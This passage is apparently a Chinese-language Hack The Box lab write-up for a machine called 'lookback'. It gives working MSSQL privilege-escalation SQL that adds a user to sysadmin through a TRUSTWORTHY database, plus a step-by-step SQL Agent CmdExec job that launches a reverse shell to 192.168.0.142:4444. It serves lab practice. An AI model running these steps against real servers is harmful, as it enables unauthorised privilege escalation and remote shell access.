```mssql
USE lookback;
SELECT USER_NAME() AS db_user,IS_ROLEMEMBER('db_owner') AS is_db_owner;
SELECT name, SUSER_SNAME(owner_sid) AS owner, is_trustworthy_on FROM sys.databases WHERE name = 'lookback';

CREATE PROCEDURE dbo.pwn WITH EXECUTE AS OWNER AS ALTER SERVER ROLE sysadmin ADD MEMBER [LOOKBACK\lookback-admin];
EXEC dbo.pwn;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

`altSecurityIdentities` 是 AD 里用来做**显式证书映射**的属性。但是我没看懂，丢给 ai 解释吧

```
显式证书映射（Explicit Certificate Mapping） 是一种身份验证机制，主要用于将用户的数字证书（通常是 X.509 格式）直接且明确地关联到特定的用户账户（如 Active Directory 中的账号或本地系统账户）。

在显式映射中，管理员需要手动或通过脚本将证书的完整信息（或者证书的 Base64 编码数据）存储在用户对象的属性中。
一对一关系：一个证书被明确指向一个特定的账户。
不依赖规则：它不关心证书的颁发者是谁，也不关心证书内的“名称”字段是否与账户名一致。只要证书的二进制数据匹配，验证就会通过。

工作流程
用户出示证书：当用户尝试访问受保护的资源（如 VPN、IIS 网站或通过智能卡登录）时，客户端发送数字证书。
系统检索属性：服务器（如域控制器或 IIS）接收到证书，并去数据库（如 LDAP/Active Directory）中查找。
比对二进制数据：系统查看用户账户的 altSecurityIdentities 属性。如果该属性中存储的证书数据与用户出示的证书完全一致，则映射成功。
授权登录：系统确认身份后，为该用户创建一个访问令牌（Access Token）。
```

事实上这些东西我也没完全看懂，尝试理解这道题的情景：“如果当前的用户有一张证书，其身份里带了 `john@lookback.htb` 这个邮件标识，那么这张证书可以映射到 `IT-email-admin` 这个账号上从而提权”

能发现文档文件夹下有一个 pdf ，下载下来看看，都是英文，直接丢给 ai 整理了：

`lookback\service_maintainer` 被专门委派了 `SQLSERVERAGENT` 的启动、停止、暂停/继续、查询配置和状态查询权限，但不能改服务配置，也不能改服务 DACL 。而且文档还强调，所有数据库自动化维护都要用这个账号，通过 `sc.exe` 或 `PowerShell Service Cmdlet` 去操作它。

这里其实真正给的是操作 `SQL Agent` 服务的权限。利用的点在于当 `SQL Agent` 运行一个 `CmdExec` 类型的 `Job Step` 时，实际执行命令的是 `SQLSERVERAGENT` 服务进程，也就是它对应的服务账号，而不是当前修改任务的 `service_maintainer`

[参考作者的博客](https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/)

查看当前的任务

```mssql
USE msdb;
SELECT name, enabled FROM dbo.sysjobs;
SELECT j.name, s.step_id, s.step_name, s.subsystem, s.command FROM dbo.sysjobs j JOIN dbo.sysjobsteps s ON j.job_id = s.job_id ORDER BY j.name, s.step_id;
```

创建恶意作业及调度

启动服务

```cmd
sc.exe start SQLSERVERAGENT
```

第一步：创建作业并记录 `JobID`

```mssql
DECLARE @JobID UNIQUEIDENTIFIER; EXEC msdb.dbo.sp_add_job @job_name = N'Test_Job_Final_Success', @enabled = 1, @description = N'test', @owner_login_name = N'sa', @job_id = @JobID OUTPUT; SELECT N'Test_Job_Final_Success' AS Created_Job_Name, @JobID AS Created_Job_ID;
```

第二步：创建 `step 1`

```mssql
EXEC msdb.dbo.sp_add_jobstep @job_id = N'YOUR-JOB-ID-HERE', @step_name = N'run_cmd', @step_id = 1, @subsystem = N'CmdExec', @command = N'cmd /c C:\Windows\Tasks\1.exe 192.168.0.142 4444 -e cmd.exe', @on_success_action = 1, @on_fail_action = 2;
```

第三步：设置启动步骤

```mssql
EXEC msdb.dbo.sp_update_job @job_id = N'YOUR-JOB-ID-HERE', @start_step_id = 1;
```

第四步：创建调度并记录 `ScheduleID`，这里设定的是5分钟定时

```mssql
DECLARE @ScheduleID INT; EXEC msdb.dbo.sp_add_schedule @schedule_name = N'Every_5_Minutes_Fixed', @enabled = 1, @freq_type = 4, @freq_interval = 1, @freq_subday_type = 4, @freq_subday_interval = 5, @active_start_time = 000000, @active_end_time = 235959, @schedule_id = @ScheduleID OUTPUT; SELECT N'Every_5_Minutes_Fixed' AS ScheduleName, @ScheduleID AS ScheduleID;
```

第五步：绑定调度

```mssql
EXEC msdb.dbo.sp_attach_schedule @job_id = N'YOUR-JOB-ID-HERE', @schedule_id = 9;
```

第六步：绑定本地服务器

```mssql
EXEC msdb.dbo.sp_add_jobserver @job_id = N'YOUR-JOB-ID-HERE', @server_name = N'(local)';
```

第七步：目标机侧准备文件与权限

```cmd
icacls C:\Windows\Tasks\1.exe /grant "NT SERVICE\SQLSERVERAGENT:(RX)"
sc.exe start SQLSERVERAGENT
sc.exe query SQLSERVERAGENT
```

第八步：手动触发 job

```mssql
EXEC msdb.dbo.sp_start_job @job_id = N'YOUR-JOB-ID-HERE';
```

如果需要也可以查看执行历史

```mssql
EXEC msdb.dbo.sp_help_jobhistory @job_id = N'YOUR-JOB-ID-HERE', @mode = N'FULL';
```
